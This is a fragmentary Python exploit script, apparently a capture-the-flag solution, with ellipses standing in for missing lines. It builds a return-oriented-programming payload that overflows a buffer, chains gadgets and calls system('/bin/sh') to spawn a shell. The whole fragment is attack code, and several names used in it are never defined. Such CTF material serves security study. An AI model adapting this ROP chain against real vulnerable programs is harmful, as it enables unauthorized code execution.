...
local_file  = './81f42c219e81421ebfd1bedd19cf7eff'
...
p4r = 0x000000000040089c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
ru('AAAAAAAAAAAAAAAAAAAAAAAA\x9c\x08\x40')
...
payload2 = 'B'*offset
payload2 += p64(p4r)
payload2 += p64(p4r) + p64(0)*4
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
payload2 = payload2.ljust(0x300,'C')
